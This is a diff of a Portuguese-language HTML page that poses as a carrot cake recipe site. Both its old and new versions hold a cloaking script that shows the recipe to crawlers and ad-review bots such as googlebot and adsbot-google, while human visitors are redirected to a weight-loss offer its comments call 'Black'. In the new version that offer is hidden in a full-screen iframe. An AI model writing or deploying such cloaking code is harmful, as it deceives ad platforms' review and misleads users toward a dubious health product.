@@ -2,43 +2,38 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Receitas de Vovó | O Melhor Bolo de Cenoura</title>
-    <script>
-        // FILTRO DE INTELIGÊNCIA (CLOAKER)
-        const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
-
-        if (!isBot) {
-            // SE FOR HUMANO: Joga para a sua oferta Black na Lovable
-            window.location.href = "https://protocoloemagrecimentodivino.lovable.app";
-        }
-    </script>
+    <title>Delícias da Vovó</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: auto; font-family: Arial, sans-serif; }
+        .safe-content { padding: 20px; max-width: 800px; margin: 0 auto; }
+        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; }
+    </style>
 </head>
-<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px;">
-    <header>
-        <h1>Delícias da Vovó: O Segredo do Bolo de Cenoura Perfeito</h1>
-    </header>
-    
-    <main>
-        <p>Se você busca uma receita clássica, fofinha e com aquela calda de chocolate crocante, você está no lugar certo. Nossa missão é preservar as receitas tradicionais de família.</p>
-        
-        <h3>Ingredientes Necessários:</h3>
-        <ul>
-            <li>3 cenouras médias raladas</li>
-            <li>3 ovos inteiros</li>
-            <li>1 xícara de óleo</li>
-            <li>2 xícaras de açúcar</li>
-            <li>2 xícaras de farinha de trigo</li>
-            <li>1 colher de sopa de fermento em pó</li>
-        </ul>
+<body>
 
-        <h3>Modo de Preparo:</h3>
-        <p>Bata no liquidificador as cenouras, os ovos e o óleo. Em uma tigela separada, misture o açúcar e a farinha. Adicione a mistura do liquidificador e mexa bem até ficar homogêneo. Por fim, adicione o fermento.</p>
-        
-        <p>Leve ao forno preaquecido a 180°C por cerca de 40 minutos.</p>
-    </main>
+<script>
+    // 1. Identifica por onde o usuário entrou
+    const currentHost = window.location.hostname;
+    // 2. Filtro de Robô simples
+    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
 
-    <footer style="margin-top: 50px; font-size: 0.8em; color: #777;">
-        <p>&copy; 2026 Receitas de Vovó - Todos os direitos reservados.</p>
-    </footer>
+    // SE entrar pelo subdomínio METODO e NÃO for robô, mostra a oferta em IFRAME (Mascarado)
+    if (currentHost.includes('metodo') && !isBot) {
+        document.write('<iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe>');
+        document.body.style.overflow = 'hidden';
+    }
+</script>
+
+<div class="safe-content">
+    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
+    <p>Esta é a receita tradicional da família...</p>
+    <h3>Ingredientes:</h3>
+    <ul>
+        <li>3 cenouras médias</li>
+        <li>3 ovos</li>
+        <li>1 xícara de óleo</li>
+    </ul>
+</div>
+
 </body>
 </html>
